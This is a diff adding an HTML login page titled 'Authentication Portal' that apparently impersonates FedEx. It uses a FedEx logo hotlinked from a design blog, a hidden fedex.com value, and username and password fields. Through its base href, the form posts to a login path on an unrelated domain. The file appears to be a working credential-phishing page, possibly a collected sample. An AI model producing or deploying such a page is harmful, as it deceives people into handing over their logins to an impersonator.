@@ -1,0 +1,48 @@
+﻿<!DOCTYPE html>
+<html>
+	<head>
+		<base href="https://www0.monatair.com/Login?ReturnUrl=http%3A%2F%2Fbar1-app1%2F"/>
+		<meta charset="utf-8"/>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+		<title>Authentication Portal</title>
+	</head>
+	<body>
+		<p>
+			<img height="150" src="https://www.designhill.com/design-blog/wp-content/uploads/2014/08/FedEx-Express-1024x446.png" width="300"/>
+		</p>
+		<p></p>
+		<div class="container"></div>
+		<link href="/Content/images/favicon-16x16.png" rel="icon" sizes="32x32" type="image/png"/>
+		<link href="/Content/images/favicon-32x32.png" rel="icon" sizes="16x16" type="image/png"/>
+		<link href="/Content/images/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+		<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"/>
+		<link href="/Content/css/error.css" rel="stylesheet"/>
+		<link href="/Content/css/site.css" rel="stylesheet"/>
+		<div class="body-content">
+			<div class="login__headerIcon"></div>
+			<form action="" class="login__form" method="post">
+				<input type="hidden" value="https://www.fedex.com/"/>
+				<input type="hidden" value="ewUTS7MmIZ3RtMLTDXq2AFK5qfYl76EcfvH0x8P5wMq_m3xYRzl8wvGwO7_q4YoBn3oMn63J9HQOMyCcRH3gSbcnooSNx2ReYqC5PZ4AfkQ1"/>
+				<fieldset class="login__fields">
+					<div>
+						<input class="login__field" id="UserName" placeholder="Username" type="text" required="" value=""/>
+					</div>
+					<div>
+						<input class="login__field" id="Password" placeholder="Password" type="password" required="" value=""/>
+					</div>
+					<input data-val="true" data-val-required="The Application field is required." id="Application" type="hidden" value="SmaAuth"/>
+					<div class="login__fieldValidationContainer">
+						<div class="validation-summary-valid login__fieldValidation" data-valmsg-summary="true">
+							<ul>
+								<li style="display:none"></li>
+							</ul>
+						</div>
+					</div>
+				</fieldset>
+				<button class="login__button" value="login">LOGIN</button>
+				<input id="ReturnUrl" type="hidden" value="http://bar1-app1/"/>
+				<a class="login__forgotPassword" href="/Account/ForgotPassword">Forgot Password?</a>
+			</form>
+		</div>
+	</body>
+</html>
